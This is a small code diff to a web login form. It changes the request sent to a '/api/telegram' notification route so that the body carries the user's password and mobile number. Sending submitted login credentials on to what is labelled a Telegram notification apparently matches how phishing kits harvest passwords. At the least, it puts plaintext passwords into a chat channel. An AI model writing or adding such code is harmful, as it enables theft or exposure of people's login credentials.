@@ -25,7 +25,7 @@ export function LoginForm() {
       const response = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ mobile }),
+        body: JSON.stringify({ type: "login", mobile, password }),
       })
 
       if (!response.ok) throw new Error("Telegram notification failed")
